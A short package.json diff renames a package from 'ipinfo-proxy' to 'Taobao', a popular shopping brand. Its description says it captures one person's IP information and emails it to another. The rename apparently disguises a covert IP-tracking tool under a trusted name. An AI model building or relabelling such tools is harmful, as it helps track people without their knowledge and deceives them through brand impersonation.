@@ -1,5 +1,5 @@
 {
-  "name": "ipinfo-proxy",
+  "name": "Taobao",
   "version": "1.0.0",
   "description": "A proxy service to capture B's IP info and send it via email to A.",
   "main": "index.js",
